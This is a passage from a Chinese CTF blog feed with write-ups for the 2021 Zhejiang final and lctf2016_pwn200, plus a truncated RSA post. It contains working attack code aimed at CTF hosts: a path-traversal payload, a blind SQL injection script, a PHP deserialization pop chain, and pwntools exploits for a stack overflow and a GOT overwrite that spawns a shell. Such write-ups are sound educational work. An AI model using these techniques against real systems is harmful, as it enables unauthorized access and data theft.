title="总结"></a>总结</h2><p>小总结一波：在更换C程序的时候需要用patchelf更改链接器的版本和runpath，C++程序换libc版本的时候需要额外指定一个libstdc++.so.6这个库才能正常运行。</p><p>总而言之，解决这个问题心情十分爽快，也希望本篇博客能帮到很多人。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021浙江省决赛</title>
      <link href="/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/"/>
      <url>/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次比赛最终rank21，幸而拿到省赛一等奖最后一名。pwn题签到拿下二血，re签到拿下还是好的，但是pwn少拿了一道有点可惜。最终还是靠学长ak web才拿下的省一，希望学长明年还能带我。下面放出本次比赛提交的wp，misc和cry因为没有留下图片(就是wps复制过来的，导出pdf之后交了，后面word删了图片也就没了)。</p><span id="more"></span><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="远古特性"><a href="#远古特性" class="headerlink" title="远古特性"></a>远古特性</h4><p>换行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint/hint.txt%0a../../../../../../flag</span><br></pre></td></tr></table></figure><h4 id="just-login"><a href="#just-login" class="headerlink" title="just login"></a>just login</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grogroupup_coonncat(username) frfromom users),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    if mid == 32 or mid == 127:</span><br><span class="line">        break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑跑脚本完事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 1</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grgroupoup_coonncat(sql) frfromom sqlite_maasster),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    # if mid == 32 or mid == 127:</span><br><span class="line">    #     break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27; + bytes.fromhex(flag).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h4><p>pop链是<code>Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="keyword">array</span>(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getFlag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> Fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="string">&#x27;aaa&#x27;</span>;<span class="comment">//传给__get的参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>然后利用PHP Bug 72663来绕过__wakeup。虽然版本是大于7.0.10，但还是可以，不知道为什么。</p><p>把payload的对象数改一下，改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:3:&quot;aaa&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;s:4:&quot;Test&quot;;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>打入，结束。</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>strcat 栈溢出，利用已经有的后门cat flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;,54500)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line">elf,libc,p=conn(0,&#x27;./sai_easy_pwn&#x27;)</span><br><span class="line"></span><br><span class="line">shell=0x40098e</span><br><span class="line">username=b&#x27;a&#x27;*0x30</span><br><span class="line">pwd=b&#x27;a&#x27;*24+p64(shell)</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;username:&#x27;,username)</span><br><span class="line">p.sendafter(b&#x27;password&#x27;,pwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="最简单的逆向"><a href="#最简单的逆向" class="headerlink" title="最简单的逆向"></a>最简单的逆向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned char enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  0x76, 0x73, 0x85, 0x75, 0x86, 0x78, 0xAD, 0x6B, 0x97, 0x68, </span><br><span class="line">  0x98, 0x67, 0x64, 0x64, 0x62, 0x97, 0x68, 0x98, 0x6B, 0x6B, </span><br><span class="line">  0x96, 0x67, 0x62, 0x69, 0x95, 0x96, 0x65, 0x96, 0x6A, 0x69, </span><br><span class="line">  0x69, 0x65, 0x66, 0x97, 0x68, 0x98, 0x6A, 0x95, 0x68, 0xAF, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    for (int i = 0; i &lt;= 39; ++i )&#123;</span><br><span class="line">        enc[i]-=50;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%s&quot;,enc);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h4><p>利用工具直接解</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h4><p>结合题目描述及pdf信息搜集，压缩包密码直接解</p><h4 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h4><p>查看log，在evil.php所有一些命令。跑脚本跑出所有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;my_site.log&#x27;</span></span><br><span class="line">p = <span class="string">&#x27;vil.php\?attack=(.*) HTTP/1.1&#x27;</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            out = re.findall(p, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> out:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s.append(out[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        f.write(<span class="built_in">str</span>(i + <span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后打印看看哪些有用的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">100</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">47</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">119</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">45</span>), <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">80</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">50</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">114</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">65281</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">46</span>), <span class="built_in">chr</span>(<span class="number">122</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">34</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">65</span>), <span class="built_in">chr</span>(<span class="number">77</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">82</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">84</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">34</span>)</span><br><span class="line">      )</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z i p   - r P   h e h e h e 2 3 3 _ I g o t r o o t ！   f l a g . z i p</span><br></pre></td></tr></table></figure><p>拿到压缩包密码，结束。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lctf2016_pwn200 writeup</title>
      <link href="/2021/10/27/lctf2016_pwn200%20writeup/"/>
      <url>/2021/10/27/lctf2016_pwn200%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec 64位保护全关，并且栈可读可写可执行，那么主要思路应该是执行shellcode了。main函数一个IO初始化和一个函数，进去发现有一个name输入，是用for - read(1)实现的，但是观察缓冲区和循环大小，发现缓冲区大小与循环次数相同，意味着如果我输入填满缓冲区，一会输出名字的时候可以泄露栈地址。sub_4007DF这个函数就是输入一个3位数值返回int。继续往下看发现它又有一个与缓冲区大小相等的一次输入，并且可以覆盖到char *dest这个指针变量，一会会将整个缓冲区以字符串形式拷贝到那个指针内的地址中。那么如果我们将ptr修改那基本是任意地址写了，加上之前泄露的站地址便可以在上面执行shellcode，但是同时也有限制，那就是这是一个字符串拷贝，如果需要在返回的时候执行shellcode那么需要填上shellcode后先放上一个jmp rsp的地址。而64位程序地址虽占8个字节但是实际高两个字节一般都是空的，后面的shellcode很可能无法拷贝。我还尝试过栈迁移，但是栈迁移需要改连续的两个为地址，也不能连续拷贝。那么可以尝试劫持got表，让它在后面执行某些函数的时候劫持到栈上面的shellcode里面。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>主要就是写在got表的地址要确定是shellcode的地址，这个可以通过自己调试去反复确定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27025</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">48</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">120</span>-<span class="number">0x28</span>-<span class="number">32</span>+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))<span class="comment">#+120</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id&#x27;</span>,<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line">payload=p64(stack_addr)+asm(shellcraft.sh())</span><br><span class="line">payload=payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400a8d&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021江西省赛RSA writeup</title>
      <link href="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/"/>
      <url>/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/</url>
      
        <content type="html"><![CDATA[<p>来源于一位师傅发的RSA的题目，这题正解是套公式，但是其实可以直接分解n。</p><p>题来康康别的师傅发给我的江西省赛的cry题，发现自己还是能很好的运用一些小技巧的，正解虽然不用分解n，但是咱还是可以分解n的hhh</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">p-q=<span 